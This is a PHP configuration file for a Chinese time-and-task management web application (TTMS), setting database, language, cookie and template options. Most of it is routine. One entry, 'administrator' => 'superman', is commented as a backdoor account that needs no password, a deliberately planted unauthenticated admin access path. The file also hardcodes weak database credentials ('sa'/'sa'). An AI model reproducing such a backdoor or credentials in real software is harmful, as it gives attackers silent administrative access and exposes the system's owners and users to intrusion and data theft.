<?php

$arr1 = array(
    /* 数据库设置 */
    'DB_TYPE' => 'mysql', // 数据库类型
    'DB_HOST' => '172.16.216.212', // 服务器地址
    'DB_NAME' => 'ttms', // 数据库名
    'DB_USER' => 'sa', // 用户名
    'DB_PWD' => 'sa', // 密码
    'DB_PORT' => 3306, // 端口
    'DB_PREFIX' => 'ttms_', // 数据库表前缀
    'DB_SUFFIX' => '', // 数据库表后缀
    'DB_FIELDTYPE_CHECK' => false, // 是否进行字段类型检查
    'DB_FIELDS_CACHE' => true, // 启用字段缓存
    'DB_CHARSET' => 'utf8', // 数据库编码默认采用utf8
    'DB_DEPLOY_TYPE' => 0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)
    'DB_RW_SEPARATE' => false, // 数据库读写是否分离 主从式有效

    'LANG_SWITCH_ON' => true,
    'LANG_SWITCH_ON' => true, // 开启多语言功能
    'DEFAULT_LANGUAGE' => 'zh-cn', // 设置默认语言为简体中文
    'title_all_rights' => '©Copyrights www.transcosmos-cn.com All rights reserved.',
    'title_oms_version' => '时间&任务管理系统 TTMS',
    'COOKIE_PREFIX' => 'ttms_',
    'administrator' => 'superman', //后门帐号，不需要密码

    'TMPL_L_DELIM' => '{', // 模板引擎普通标签开始标记    
    'TMPL_R_DELIM' => '}', // 模板引擎普通标签
    'TAGLIB_BEGIN' => '{', // 标签库标签开始标记    
    'TAGLIB_END' => '}', // 标签库标签结束标记  
);

$status = include 'status.inc.php';
return array_merge($arr1, $status);
?>